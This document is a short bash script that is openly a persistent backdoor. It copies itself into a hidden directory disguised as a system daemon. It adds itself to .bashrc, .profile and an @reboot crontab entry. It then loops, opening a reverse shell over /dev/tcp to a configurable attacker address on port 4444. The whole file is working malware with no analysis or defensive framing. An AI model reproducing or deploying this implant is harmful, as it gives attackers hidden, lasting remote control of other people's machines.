#!/bin/bash

# === Settings ===
LHOST="0.0.0.0"   # Attacker IP (değiştir)
LPORT="4444"            # Port
HIDE_DIR="$HOME/.config/.syslogd"
SCRIPT_NAME="client.sh"
TARGET_SCRIPT="$HIDE_DIR/$SCRIPT_NAME"

# === Hide Script ===
mkdir -p "$HIDE_DIR"
if [ "$0" != "$TARGET_SCRIPT" ]; then
    cp "$0" "$TARGET_SCRIPT"
    chmod +x "$TARGET_SCRIPT"
fi

# === .bashrc Persistence ===
if ! grep -q "$TARGET_SCRIPT" "$HOME/.bashrc"; then
    echo "bash $TARGET_SCRIPT &" >> "$HOME/.bashrc"
fi

# === .profile Persistence ===
if ! grep -q "$TARGET_SCRIPT" "$HOME/.profile"; then
    echo "bash $TARGET_SCRIPT &" >> "$HOME/.profile"
fi

# === crontab Persistence ===
CRON_ENTRY="@reboot bash $TARGET_SCRIPT"
( crontab -l 2>/dev/null | grep -Fv "$TARGET_SCRIPT"; echo "$CRON_ENTRY" ) | crontab -

# === Reverse Shell Function ===
reverse_shell() {
    while true; do
        bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
        sleep 15
    done
}

# === Run ===
reverse_shell
